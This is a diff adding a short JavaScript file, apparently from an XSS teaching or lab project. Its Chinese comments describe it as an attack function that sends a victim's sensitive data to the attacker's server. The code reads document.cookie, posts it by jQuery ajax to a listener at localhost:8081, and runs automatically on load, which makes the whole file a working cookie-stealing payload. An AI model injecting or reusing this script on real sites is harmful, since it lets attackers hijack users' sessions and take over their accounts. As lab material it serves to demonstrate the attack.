@@ -1,0 +1,22 @@
+/**
+ * 编写攻击函数
+ * 实质就是获取被攻击者的一些敏感数据，发送给攻击者的服务器
+ */
+;function attck(){
+    // 为方便直接使用jquery方法
+    $.ajax({
+        url: "http://localhost:8081/listener/log",
+        type: "POST",
+        dataType: "json",
+        data: JSON.stringify({data: document.cookie}),
+        processData: false,
+        contentType: "application/json",
+        success: function(arg) {
+            console.log(arg);
+            console.log("监听到数据");
+        }
+    });
+};
+
+// 被加载方法后直接执行攻击方法
+attck();
